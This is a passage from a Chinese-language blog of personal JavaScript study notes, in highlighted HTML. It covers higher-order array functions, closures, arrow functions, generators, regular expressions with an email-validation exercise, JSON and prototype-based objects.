class=\"line\">\tgrades : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;  <span class=\"comment\">//捕捉this指针</span></span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getGrades</span>(<span class=\"params\"></span>)</span>&#123;  <span class=\"comment\">//进行重构</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> that.math+that.en;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> getGrades();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"高阶函数\"><a href=\"#高阶函数\" class=\"headerlink\" title=\"高阶函数\"></a>高阶函数</h2><h3 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h3><p>由于<code>map()</code>方法定义在JavaScript的<code>Array</code>中，我们调用<code>Array</code>的<code>map()</code>方法，传入我们自己的函数，就得到了一个新的<code>Array</code>作为结果。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\">arr.map(<span class=\"function\"><span class=\"params\">x</span>=&gt;</span>x*<span class=\"number\">2</span>); <span class=\"comment\">//[2,4,6]</span></span><br><span class=\"line\">arr.map(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x</span>)</span>&#123;<span class=\"keyword\">return</span> x*<span class=\"number\">2</span>;&#125;); <span class=\"comment\">//[2,4,6]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"reduce\"><a href=\"#reduce\" class=\"headerlink\" title=\"reduce\"></a>reduce</h3><p>rray的<code>reduce()</code>把一个函数作用在这个<code>Array</code>的<code>[x1, x2, x3...]</code>上，这个函数必须接收两个参数，<code>reduce()</code>把结果继续和序列的下一个元素做累积计算。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [x1,x2,x3,x4];</span><br><span class=\"line\">arr.reduce(<span class=\"function\">(<span class=\"params\">x,y</span>)=&gt;</span>(x+y)); <span class=\"comment\">//x1+x2+x3+x4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * <span class=\"number\">10</span> + y;</span><br><span class=\"line\">&#125;); <span class=\"comment\">// 13579</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a><strong>filter</strong></h3><p>filter也是一个常用的操作，它用于把<code>Array</code>的某些元素过滤掉，然后返回剩下的元素。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x%<span class=\"number\">2</span> !=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(r);</span><br></pre></td></tr></table></figure>\n<h3 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort\"></a>sort</h3><p>js中排序算法是先把所有元素先转换为String再按照ascii码排序。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr &#x3D; [10,20,1,2];</span><br><span class=\"line\">var r &#x3D; arr.sort(function(x,y)&#123;</span><br><span class=\"line\">\tif(x&lt;y)return 1;</span><br><span class=\"line\">\telse if(x&gt;y)return -1;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">console.log(arr) &#x2F;&#x2F;[20,10,2,1]</span><br><span class=\"line\">console.log(r)  &#x2F;&#x2F;[20,10,2,1]</span><br></pre></td></tr></table></figure>\n<p><code>sort()</code>方法会直接对<code>Array</code>进行修改，它返回的结果仍是当前<code>Array</code>。</p>\n<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><p><strong>函数作为返回值</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">lazy_sum</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sum = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> f = lazy_sum([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]);</span><br><span class=\"line\">f;   <span class=\"comment\">//f是返回sum函数本身</span></span><br><span class=\"line\">f();  <span class=\"comment\">//f()才是调用函数</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"箭头函数\"><a href=\"#箭头函数\" class=\"headerlink\" title=\"箭头函数\"></a>箭头函数</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//无&#123;&#125;的</span></span><br><span class=\"line\">x =&gt; x*x</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x*x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//返回多条</span></span><br><span class=\"line\">x =&gt; &#123;</span><br><span class=\"line\">\t... return ;</span><br><span class=\"line\">\t... return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//多个参数</span></span><br><span class=\"line\">(x,y) =&gt; x*x+y*y</span><br><span class=\"line\"><span class=\"comment\">//返回对象</span></span><br><span class=\"line\">x =&gt; (&#123;<span class=\"attr\">foo</span>:x&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"generator\"><a href=\"#generator\" class=\"headerlink\" title=\"generator\"></a>generator</h2><p>generator由<code>function*</code>定义（注意多出的<code>*</code>号），并且，除了<code>return</code>语句，还可以用<code>yield</code>返回多次。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function* foo(x)&#123;</span><br><span class=\"line\">  yield x+1;</span><br><span class=\"line\">  yield x+2;</span><br><span class=\"line\">  return x+3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(2);</span><br></pre></td></tr></table></figure>\n<p>调用generator对象有两个方法，</p>\n<ul>\n<li><p>一是不断地调用generator对象的<code>next()</code>方法<code>next()</code>方法会执行generator的代码，然后，每次遇到<code>yield x;</code>就返回一个对象<code>{value: x, done: true/false}</code>，然后“暂停”。返回的<code>value</code>就是<code>yield</code>的返回值，<code>done</code>表示这个generator是否已经执行结束了。如果<code>done</code>为<code>true</code>，则<code>value</code>就是<code>return</code>的返回值。</p>\n</li>\n<li><p>第二个方法是直接用<code>for ... of</code>循环迭代generator对象，这种方式不需要我们自己判断<code>done</code>。</p>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//第一种</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = foo(<span class=\"number\">2</span>);</span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 3, done: false&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 4, done: false&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 5, done: true&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: undefined, done: true&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//第二种</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> x <span class=\"keyword\">of</span> foo(<span class=\"number\">2</span>))&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(x);</span><br><span class=\"line\">&#125;  <span class=\"comment\">//3,4</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"标准对象\"><a href=\"#标准对象\" class=\"headerlink\" title=\"标准对象\"></a>标准对象</h1><ul>\n<li>不要使用<code>new Number()</code>、<code>new Boolean()</code>、<code>new String()</code>创建包装对象；</li>\n<li>用<code>parseInt()</code>或<code>parseFloat()</code>来转换任意类型到<code>number</code>；</li>\n<li>用<code>String()</code>来转换任意类型到<code>string</code>，或者直接调用某个对象的<code>toString()</code>方法；</li>\n<li>通常不必把任意类型转换为<code>boolean</code>再判断，因为可以直接写<code>if (myVar) {...}</code>；</li>\n<li><code>typeof</code>操作符可以判断出<code>number</code>、<code>boolean</code>、<code>string</code>、<code>function</code>和<code>undefined</code>；</li>\n<li>判断<code>Array</code>要使用<code>Array.isArray(arr)</code>；</li>\n<li>判断<code>null</code>请使用<code>myVar === null</code>；</li>\n<li>判断某个全局变量是否存在用<code>typeof window.myVar === &#39;undefined&#39;</code>；</li>\n<li>函数内部判断某个变量是否存在用<code>typeof myVar === &#39;undefined&#39;</code>。</li>\n</ul>\n<h2 id=\"Date\"><a href=\"#Date\" class=\"headerlink\" title=\"Date\"></a>Date</h2><p>在JavaScript中，<code>Date</code>对象用来表示日期和时间。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var now &#x3D; new Date();</span><br><span class=\"line\">now.getMilliseconds();  &#x2F;&#x2F;毫秒数</span><br><span class=\"line\">now.getTime();  &#x2F;&#x2F;时间戳</span><br><span class=\"line\">var d &#x3D; new Date(2020,6,30,8,39,30,123)  &#x2F;&#x2F;自定义时间</span><br></pre></td></tr></table></figure>\n<h2 id=\"RegExp\"><a href=\"#RegExp\" class=\"headerlink\" title=\"RegExp\"></a>RegExp</h2><h3 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a><strong>基础</strong></h3><p><code>\\d</code>可以匹配一个数字</p>\n<p><code>\\w</code>可以匹配一个字母或数字</p>\n<p><code>.</code>可以匹配任意字符</p>\n<p><code>*</code>表示任意个字符</p>\n<p><code>+</code>表示至少一个字符</p>\n<p><code>?</code>表示0个或1个字符</p>\n<p><code>{n}</code>表示n个字符</p>\n<p><code>{n,m}</code>表示n-m个字符</p>\n<h3 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a><strong>进阶</strong></h3><p>要做更精确地匹配，可以用<code>[]</code>表示范围</p>\n<ul>\n<li><code>[0-9a-zA-Z\\_]</code>可以匹配一个数字、字母或者下划线；</li>\n<li><code>[0-9a-zA-Z\\_]+</code>可以匹配至少由一个数字、字母或者下划线组成的字符串，比如<code>&#39;a100&#39;</code>，<code>&#39;0_Z&#39;</code>，<code>&#39;js2015&#39;</code>等等；</li>\n<li><code>[a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]*</code>可以匹配由字母或下划线 d号开头，后接任意个由一个数字、字母或者下划线 d号组成的字符串，也就是JavaScript允许的变量名；</li>\n<li><code>[a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]{0, 19}</code>更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。</li>\n</ul>\n<p><code>A|B</code>可以匹配A或B</p>\n<p><code>^</code>表示行的开头，<code>^\\d</code>表示必须以数字开头。</p>\n<p><code>$</code>表示行的结束，<code>\\d$</code>表示必须以数字结束。</p>\n<h3 id=\"js正则\"><a href=\"#js正则\" class=\"headerlink\" title=\"js正则\"></a><strong>js正则</strong></h3><p>JavaScript有两种方式创建一个正则表达式：</p>\n<p>第一种方式是直接通过<code>/正则表达式/</code>写出来，第二种方式是通过<code>new RegExp(&#39;正则表达式&#39;)</code>创建一个RegExp对象。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;第一种</span><br><span class=\"line\">var re1 &#x3D; &#x2F;ABC&#x2F;;</span><br><span class=\"line\">&#x2F;&#x2F;第二种</span><br><span class=\"line\">var re2 &#x3D; new RegExp(&#39;ABC&#39;);</span><br></pre></td></tr></table></figure>\n<p>RegExp对象的<code>test()</code>方法用于测试给定的字符串是否符合条件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re2.test(&#39;ABC&#39;);  &#x2F;&#x2F;true</span><br><span class=\"line\">re2.test(&#39;abc&#39;);  &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>\n<p><strong>切分字符串</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a b   c'</span>.split(<span class=\"string\">' '</span>); <span class=\"comment\">// ['a', 'b', '', '', 'c']</span></span><br><span class=\"line\"><span class=\"string\">'a b   c'</span>.split(<span class=\"regexp\">/\\s+/</span>); <span class=\"comment\">// ['a', 'b', 'c']</span></span><br><span class=\"line\"><span class=\"string\">'a,b, c  d'</span>.split(<span class=\"regexp\">/[\\s\\,]+/</span>); <span class=\"comment\">// ['a', 'b', 'c', 'd']</span></span><br><span class=\"line\"><span class=\"string\">'a,b;; c  d'</span>.split(<span class=\"regexp\">/[\\s\\,\\;]+/</span>); <span class=\"comment\">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure>\n<p><strong>分组</strong></p>\n<p>用<code>()</code>表示的就是要提取的分组（Group）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/</span>;</span><br><span class=\"line\">re.exec(<span class=\"string\">'010-12345'</span>); <span class=\"comment\">// ['010-12345', '010', '12345']</span></span><br><span class=\"line\">re.exec(<span class=\"string\">'010 12345'</span>); <span class=\"comment\">// null</span></span><br></pre></td></tr></table></figure>\n<p>如果正则表达式中定义了组，就可以在<code>RegExp</code>对象上用<code>exec()</code>方法提取出子串来。</p>\n<p><code>exec()</code>方法在匹配成功后，会返回一个<code>Array</code>，第一个元素是正则表达式匹配到的整个字符串，后面的字符串表示匹配成功的子串。</p>\n<p><code>exec()</code>方法在匹配失败时返回<code>null</code>。</p>\n<h3 id=\"贪婪匹配\"><a href=\"#贪婪匹配\" class=\"headerlink\" title=\"*贪婪匹配\"></a><strong>*贪婪匹配</strong></h3><p>需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var re &#x3D; &#x2F;^(\\d+)(0*)$&#x2F;;</span><br><span class=\"line\">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;]</span><br></pre></td></tr></table></figure>\n<p>由于<code>\\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p>\n<p>必须让<code>\\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\\d+</code>采用非贪婪匹配：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var re &#x3D; &#x2F;^(\\d+?)(0*)$&#x2F;;</span><br><span class=\"line\">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;]</span><br></pre></td></tr></table></figure>\n<p><strong>全局搜索</strong></p>\n<p>JavaScript的正则表达式还有几个特殊的标志，最常用的是<code>g</code>，表示全局匹配。正则表达式还可以指定<code>i</code>标志，表示忽略大小写，<code>m</code>标志，表示执行多行匹配。</p>\n<p><strong>作业</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//请尝试写一个验证Email地址的正则表达式。</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^[0-9a-zA-Z\\.]+\\@[0-9a-zA-Z]+\\.(com|org)$/</span>;</span><br><span class=\"line\">hould_pass = [<span class=\"string\">'someone@gmail.com'</span>, <span class=\"string\">'bill.gates@microsoft.com'</span>, <span class=\"string\">'tom@voyager.org'</span>, <span class=\"string\">'bob2015@163.com'</span>],</span><br><span class=\"line\">    should_fail = [<span class=\"string\">'test#gmail.com'</span>, <span class=\"string\">'bill@microsoft'</span>, <span class=\"string\">'bill%gates@ms.com'</span>, <span class=\"string\">'@voyager.org'</span>];</span><br><span class=\"line\"><span class=\"comment\">//验证并提取出带名字的Email地址</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^\\&lt;(\\w+\\s+\\w+)\\&gt; (\\w+\\.*\\@\\w+\\.+\\w+)$/</span>;</span><br><span class=\"line\">shoule_pass = <span class=\"string\">'&lt;Tom Paris&gt; tom@voyager.org'</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>写正则首先要注意转义如：\\s ,\\w,\\d</li>\n<li>大小写用i标志</li>\n</ul>\n<h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><ul>\n<li>number：和JavaScript的<code>number</code>完全一致；</li>\n<li>boolean：就是JavaScript的<code>true</code>或<code>false</code>；</li>\n<li>string：就是JavaScript的<code>string</code>；</li>\n<li>null：就是JavaScript的<code>null</code>；</li>\n<li>array：就是JavaScript的<code>Array</code>表示方式——<code>[]</code>；</li>\n<li>object：就是JavaScript的<code>{ ... }</code>表示方式。</li>\n</ul>\n<p>为了统一解析，JSON的字符串规定必须用双引号<code>&quot;&quot;</code>，Object的键也必须用双引号<code>&quot;&quot;</code>。</p>\n<h3 id=\"序列化\"><a href=\"#序列化\" class=\"headerlink\" title=\"序列化\"></a><strong>序列化</strong></h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">\t\tname: <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\t\tage: <span class=\"number\">14</span>,</span><br><span class=\"line\">\t\theight: <span class=\"number\">165</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"built_in\">JSON</span>.stringify(xiaoming);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s); <span class=\"comment\">//&#123;\"name\":\"xiaoming\",\"age\":14,\"height\":165&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"built_in\">JSON</span>.stringify(xiaoming,<span class=\"literal\">null</span>,<span class=\"string\">' '</span>); </span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s); <span class=\"comment\">//\"&#123;</span></span><br><span class=\"line\"> <span class=\"string\">\"name\"</span>: <span class=\"string\">\"xiaoming\"</span>,</span><br><span class=\"line\"> <span class=\"string\">\"age\"</span>: <span class=\"number\">14</span>,</span><br><span class=\"line\"> <span class=\"string\">\"height\"</span>: <span class=\"number\">165</span></span><br><span class=\"line\">&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">//stringify(a,b,c)</span></span><br><span class=\"line\"><span class=\"string\">//a为对象名，b为指定的属性或者为一个函数，如['age','name'],c为' '代表逐行输出</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h3><p>拿到一个JSON格式的字符串，我们直接用<code>JSON.parse()</code>把它变成一个JavaScript对象。</p>\n<p><code>JSON.parse()</code>还可以接收一个函数，用来转换解析出的属性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">JSON</span>.parse(<span class=\"string\">'&#123;\"name\":\"小明\",\"age\":14&#125;'</span>); <span class=\"comment\">// Object &#123;name: '小明', age: 14&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//接受函数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"built_in\">JSON</span>.parse(<span class=\"string\">'&#123;\"name\":\"小明\",\"age\":14&#125;'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">key,value</span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (key ===<span class=\"string\">'name'</span>)&#123;<span class=\"keyword\">return</span> value + <span class=\"string\">'同学'</span>&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"面向对象编程\"><a href=\"#面向对象编程\" class=\"headerlink\" title=\"面向对象编程\"></a>面向对象编程</h1><p>在js中没有类的概念，所有的对象都是实例，继承关系不过是把一个对象的原型指向另一个对象而已。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 原型对象:</span><br><span class=\"line\">var Student &#x3D; &#123;</span><br><span class=\"line\">    name: &#39;Robot&#39;,</span><br><span class=\"line\">    height: 1.2,</span><br><span class=\"line\">    run: function () &#123;</span><br><span class=\"line\">        console.log(this.name + &#39; is running...&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">function createStudent(name) &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 基于Student原型创建一个新对象:</span><br><span class=\"line\">    var s &#x3D; Object.create(Student);</span><br><span class=\"line\">    &#x2F;&#x2F; 初始化新对象:</span><br><span class=\"line\">    s.name &#x3D; name;</span><br><span class=\"line\">    return s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var xiaoming &#x3D; createStudent(&#39;小明&#39;);</span><br><span class=\"line\">xiaoming.run(); &#x2F;&#x2F; 小明 is running...</span><br><span class=\"line\">xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建对象\"><a href=\"#创建对象\" class=\"headerlink\" title=\"创建对象\"></a>创建对象</h2><p>JavaScript对每个创建的对象都会设置一个原型，指向它的原型对象。</p>\n<p>当我们用<code>obj.xxx</code>访问一个对象的属性时，JavaScript引擎先在当前对象上查找该属性，如果没有找到，就到其原型对象上找，如果还没有找到，就一直上溯到<code>Object.prototype</code>对象，最后，如果还没有找到，就只能返回<code>undefined</code>。</p>\n<p><strong>构造函数</strong></p>\n<p>除了直接用<code>{ ... }</code>创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Student(name) &#123;</span><br><span class=\"line\">    this.name &#x3D; name;</span><br><span class=\"line\">    this.hello &#x3D; function () &#123;</span><br><span class=\"line\">        alert(&#39;Hello, &#39; + this.name + &#39;!&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var xiaoming &#x3D; new Student(&#39;xiaoming&#39;)</span><br></pre></td></tr></table></figure>\n<p>写了<code>new</code>，它就变成了一个构造函数，它绑定的<code>this</code>指向新创建的对象，并默认返回<code>this</code>，也就是说，不需要在最后写<code>return this;</code></p>\n<p><strong>原型链：</strong></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730195400823.png\" alt=\"image-20200730195400823\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;常用创建对象</span><br><span class=\"line\">function Student(props)&#123;</span><br><span class=\"line\">\tthis.name 